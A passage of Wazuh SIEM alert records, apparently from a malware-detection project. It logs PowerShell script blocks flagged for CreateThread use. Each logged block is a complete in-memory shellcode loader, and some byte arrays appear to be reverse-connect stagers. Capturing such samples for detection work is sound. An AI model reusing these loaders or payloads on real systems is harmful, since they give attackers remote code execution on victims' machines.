1):\r\n$ypwg = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ypwg -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd8,0xbf,0xa2,0x5e,0x51,0xf8,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x31,0x7d,0x18,0x03,0x7d,0x18,0x83,0xed,0x5e,0xbc,0xa4,0x04,0x76,0xc3,0x47,0xf5,0x86,0xa4,0xce,0x10,0xb7,0xe4,0xb5,0x51,0xe7,0xd4,0xbe,0x34,0x0b,0x9e,0x93,0xac,0x98,0xd2,0x3b,0xc2,0x29,0x58,0x1a,0xed,0xaa,0xf1,0x5e,0x6c,0x28,0x08,0xb3,0x4e,0x11,0xc3,0xc6,0x8f,0x56,0x3e,0x2a,0xdd,0x0f,0x34,0x99,0xf2,0x24,0x00,0x22,0x78,0x76,0x84,0x22,0x9d,0xce,0xa7,0x03,0x30,0x45,0xfe,0x83,0xb2,0x8a,0x8a,0x8d,0xac,0xcf,0xb7,0x44,0x46,0x3b,0x43,0x57,0x8e,0x72,0xac,0xf4,0xef,0xbb,0x5f,0x04,0x37,0x7b,0x80,0x73,0x41,0x78,0x3d,0x84,0x96,0x03,0x99,0x01,0x0d,0xa3,0x6a,0xb1,0xe9,0x52,0xbe,0x24,0x79,0x58,0x0b,0x22,0x25,0x7c,0x8a,0xe7,0x5d,0x78,0x07,0x06,0xb2,0x09,0x53,0x2d,0x16,0x52,0x07,0x4c,0x0f,0x3e,0xe6,0x71,0x4f,0xe1,0x57,0xd4,0x1b,0x0f,0x83,0x65,0x46,0x47,0x60,0x44,0x79,0x97,0xee,0xdf,0x0a,0xa5,0xb1,0x4b,0x85,0x85,0x3a,0x52,0x52,0xea,0x10,0x22,0xcc,0x15,0x9b,0x53,0xc4,0xd1,0xcf,0x03,0x7e,0xf0,0x6f,0xc8,0x7e,0xfd,0xa5,0x65,0x7a,0x69,0xec,0x7a,0x91,0xa2,0x98,0x78,0x99,0x25,0x05,0xf4,0x7f,0x15,0xe5,0x56,0xd0,0xd5,0x55,0x17,0x80,0xbd,0xbf,0x98,0xff,0xdd,0xbf,0x72,0x68,0x77,0x50,0x2b,0xc0,0xef,0xc9,0x76,0x9a,0x8e,0x16,0xad,0xe6,0x90,0x9d,0x42,0x16,0x5e,0x56,0x2e,0x04,0x36,0x96,0x65,0x76,0x90,0xa9,0x53,0x1d,0x1c,0x3c,0x58,0xb4,0x4b,0xa8,0x62,0xe1,0xbb,0x77,0x9c,0xc4,0xb0,0xbe,0x08,0xa7,0xae,0xbe,0xdc,0x27,0x2e,0xe9,0xb6,0x27,0x46,0x4d,0xe3,0x7b,0x73,0x92,0x3e,0xe8,0x28,0x07,0xc1,0x59,0x9d,0x80,0xa9,0x67,0xf8,0xe7,0x75,0x97,0x2f,0xf6,0x4a,0x4e,0x09,0x8c,0xa2,0x52;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$VkS=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($VkS.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$VkS,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 10473e5b-67be-4943-a0b8-f888c1f4e26b\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2857.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$ypwg = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ypwg -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd8,0xbf,0xa2,0x5e,0x51,0xf8,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x31,0x7d,0x18,0x03,0x7d,0x18,0x83,0xed,0x5e,0xbc,0xa4,0x04,0x76,0xc3,0x47,0xf5,0x86,0xa4,0xce,0x10,0xb7,0xe4,0xb5,0x51,0xe7,0xd4,0xbe,0x34,0x0b,0x9e,0x93,0xac,0x98,0xd2,0x3b,0xc2,0x29,0x58,0x1a,0xed,0xaa,0xf1,0x5e,0x6c,0x28,0x08,0xb3,0x4e,0x11,0xc3,0xc6,0x8f,0x56,0x3e,0x2a,0xdd,0x0f,0x34,0x99,0xf2,0x24,0x00,0x22,0x78,0x76,0x84,0x22,0x9d,0xce,0xa7,0x03,0x30,0x45,0xfe,0x83,0xb2,0x8a,0x8a,0x8d,0xac,0xcf,0xb7,0x44,0x46,0x3b,0x43,0x57,0x8e,0x72,0xac,0xf4,0xef,0xbb,0x5f,0x04,0x37,0x7b,0x80,0x73,0x41,0x78,0x3d,0x84,0x96,0x03,0x99,0x01,0x0d,0xa3,0x6a,0xb1,0xe9,0x52,0xbe,0x24,0x79,0x58,0x0b,0x22,0x25,0x7c,0x8a,0xe7,0x5d,0x78,0x07,0x06,0xb2,0x09,0x53,0x2d,0x16,0x52,0x07,0x4c,0x0f,0x3e,0xe6,0x71,0x4f,0xe1,0x57,0xd4,0x1b,0x0f,0x83,0x65,0x46,0x47,0x60,0x44,0x79,0x97,0xee,0xdf,0x0a,0xa5,0xb1,0x4b,0x85,0x85,0x3a,0x52,0x52,0xea,0x10,0x22,0xcc,0x15,0x9b,0x53,0xc4,0xd1,0xcf,0x03,0x7e,0xf0,0x6f,0xc8,0x7e,0xfd,0xa5,0x65,0x7a,0x69,0xec,0x7a,0x91,0xa2,0x98,0x78,0x99,0x25,0x05,0xf4,0x7f,0x15,0xe5,0x56,0xd0,0xd5,0x55,0x17,0x80,0xbd,0xbf,0x98,0xff,0xdd,0xbf,0x72,0x68,0x77,0x50,0x2b,0xc0,0xef,0xc9,0x76,0x9a,0x8e,0x16,0xad,0xe6,0x90,0x9d,0x42,0x16,0x5e,0x56,0x2e,0x04,0x36,0x96,0x65,0x76,0x90,0xa9,0x53,0x1d,0x1c,0x3c,0x58,0xb4,0x4b,0xa8,0x62,0xe1,0xbb,0x77,0x9c,0xc4,0xb0,0xbe,0x08,0xa7,0xae,0xbe,0xdc,0x27,0x2e,0xe9,0xb6,0x27,0x46,0x4d,0xe3,0x7b,0x73,0x92,0x3e,0xe8,0x28,0x07,0xc1,0x59,0x9d,0x80,0xa9,0x67,0xf8,0xe7,0x75,0x97,0x2f,0xf6,0x4a,0x4e,0x09,0x8c,0xa2,0x52;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$VkS=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($VkS.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$VkS,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"10473e5b-67be-4943-a0b8-f888c1f4e26b","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2857.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:33.259+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":147,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304433.3389475","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:53.1378709Z","eventRecordID":"145451","processID":"6496","threadID":"8328","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$iMgB7x = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $iMgB7x -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x0e,0xbb,0x6f,0x44,0xda,0xd6,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x58,0x0f,0x03,0x58,0x01,0x59,0x9a,0xb8,0xf5,0x1f,0x65,0x41,0x05,0x40,0xef,0xa4,0x34,0x40,0x8b,0xad,0x66,0x70,0xdf,0xe0,0x8a,0xfb,0x8d,0x10,0x19,0x89,0x19,0x16,0xaa,0x24,0x7c,0x19,0x2b,0x14,0xbc,0x38,0xaf,0x67,0x91,0x9a,0x8e,0xa7,0xe4,0xdb,0xd7,0xda,0x05,0x89,0x80,0x91,0xb8,0x3e,0xa5,0xec,0x00,0xb4,0xf5,0xe1,0x00,0x29,0x4d,0x03,0x20,0xfc,0xc6,0x5a,0xe2,0xfe,0x0b,0xd7,0xab,0x18,0x48,0xd2,0x62,0x92,0xba,0xa8,0x74,0x72,0xf3,0x51,0xda,0xbb,0x3c,0xa0,0x22,0xfb,0xfa,0x5b,0x51,0xf5,0xf9,0xe6,0x62,0xc2,0x80,0x3c,0xe6,0xd1,0x22,0xb6,0x50,0x3e,0xd3,0x1b,0x06,0xb5,0xdf,0xd0,0x4c,0x91,0xc3,0xe7,0x81,0xa9,0xff,0x6c,0x24,0x7e,0x76,0x36,0x03,0x5a,0xd3,0xec,0x2a,0xfb,0xb9,0x43,0x52,0x1b,0x62,0x3b,0xf6,0x57,0x8e,0x28,0x8b,0x35,0xc6,0x9d,0xa6,0xc5,0x16,0x8a,0xb1,0xb6,0x24,0x15,0x6a,0x51,0x04,0xde,0xb4,0xa6,0x6b,0xf5,0x01,0x38,0x92,0xf6,0x71,0x10,0x50,0xa2,0x21,0x0a,0x71,0xcb,0xa9,0xca,0x7e,0x1e,0x47,0xce,0xe8,0x0d,0x8c,0xda,0xeb,0x25,0xaf,0xda,0xfe,0x1d,0x26,0x3c,0x50,0x0e,0x69,0x91,0x10,0xfe,0xc9,0x41,0xf8,0x14,0xc6,0xbe,0x18,0x17,0x0c,0xd7,0xb2,0xf8,0xf9,0x8f,0x2a,0x60,0xa0,0x44,0xcb,0x6d,0x7e,0x21,0xcb,0xe6,0x8d,0xd5,0x85,0x0e,0xfb,0xc5,0x71,0xff,0xb6,0xb4,0xd7,0x00,0x6d,0xd2,0xd7,0x94,0x8a,0x75,0x80,0x00,0x91,0xa0,0xe6,0x8e,0x6a,0x87,0x7d,0x06,0xff,0x68,0xe9,0x67,0xef,0x68,0xe9,0x31,0x65,0x69,0x81,0xe5,0xdd,0x3a,0xb4,0xe9,0xcb,0x2e,0x65,0x7c,0xf4,0x06,0xda,0xd7,0x9c,0xa4,0x05,0x1f,0x03,0x56,0x60,0xa1,0x7f,0x81,0x4c,0xd7,0x91,0x11;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$iMg=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($iMg.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$iMg,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 19754d51-812f-4450-ad69-f6d37aa34f63\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2867.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$iMgB7x = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $iMgB7x -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x0e,0xbb,0x6f,0x44,0xda,0xd6,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x58,0x0f,0x03,0x58,0x01,0x59,0x9a,0xb8,0xf5,0x1f,0x65,0x41,0x05,0x40,0xef,0xa4,0x34,0x40,0x8b,0xad,0x66,0x70,0xdf,0xe0,0x8a,0xfb,0x8d,0x10,0x19,0x89,0x19,0x16,0xaa,0x24,0x7c,0x19,0x2b,0x14,0xbc,0x38,0xaf,0x67,0x91,0x9a,0x8e,0xa7,0xe4,0xdb,0xd7,0xda,0x05,0x89,0x80,0x91,0xb8,0x3e,0xa5,0xec,0x00,0xb4,0xf5,0xe1,0x00,0x29,0x4d,0x03,0x20,0xfc,0xc6,0x5a,0xe2,0xfe,0x0b,0xd7,0xab,0x18,0x48,0xd2,0x62,0x92,0xba,0xa8,0x74,0x72,0xf3,0x51,0xda,0xbb,0x3c,0xa0,0x22,0xfb,0xfa,0x5b,0x51,0xf5,0xf9,0xe6,0x62,0xc2,0x80,0x3c,0xe6,0xd1,0x22,0xb6,0x50,0x3e,0xd3,0x1b,0x06,0xb5,0xdf,0xd0,0x4c,0x91,0xc3,0xe7,0x81,0xa9,0xff,0x6c,0x24,0x7e,0x76,0x36,0x03,0x5a,0xd3,0xec,0x2a,0xfb,0xb9,0x43,0x52,0x1b,0x62,0x3b,0xf6,0x57,0x8e,0x28,0x8b,0x35,0xc6,0x9d,0xa6,0xc5,0x16,0x8a,0xb1,0xb6,0x24,0x15,0x6a,0x51,0x04,0xde,0xb4,0xa6,0x6b,0xf5,0x01,0x38,0x92,0xf6,0x71,0x10,0x50,0xa2,0x21,0x0a,0x71,0xcb,0xa9,0xca,0x7e,0x1e,0x47,0xce,0xe8,0x0d,0x8c,0xda,0xeb,0x25,0xaf,0xda,0xfe,0x1d,0x26,0x3c,0x50,0x0e,0x69,0x91,0x10,0xfe,0xc9,0x41,0xf8,0x14,0xc6,0xbe,0x18,0x17,0x0c,0xd7,0xb2,0xf8,0xf9,0x8f,0x2a,0x60,0xa0,0x44,0xcb,0x6d,0x7e,0x21,0xcb,0xe6,0x8d,0xd5,0x85,0x0e,0xfb,0xc5,0x71,0xff,0xb6,0xb4,0xd7,0x00,0x6d,0xd2,0xd7,0x94,0x8a,0x75,0x80,0x00,0x91,0xa0,0xe6,0x8e,0x6a,0x87,0x7d,0x06,0xff,0x68,0xe9,0x67,0xef,0x68,0xe9,0x31,0x65,0x69,0x81,0xe5,0xdd,0x3a,0xb4,0xe9,0xcb,0x2e,0x65,0x7c,0xf4,0x06,0xda,0xd7,0x9c,0xa4,0x05,0x1f,0x03,0x56,0x60,0xa1,0x7f,0x81,0x4c,0xd7,0x91,0x11;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$iMg=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($iMg.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$iMg,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"19754d51-812f-4450-ad69-f6d37aa34f63","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2867.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:34.235+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":148,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304434.3400848","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:54.0122256Z","eventRecordID":"145455","processID":"7324","threadID":"6616","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xb5,0xa2,0x01,0x7e,0x68,0x02,0x00,0x27,0x0f,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: d078b517-354c-4927-b10a-eb415c0f3cd2\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\287.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xb5,0xa2,0x01,0x7e,0x68,0x02,0x00,0x27,0x0f,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"d078b517-354c-4927-b10a-eb415c0f3cd2","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\287.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:34.336+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":149,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304434.3412653","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:54.8408387Z","eventRecordID":"145459","processID":"9028","threadID":"5504","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$949 = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $949 -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb3,0xec,0xe0,0x68,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = 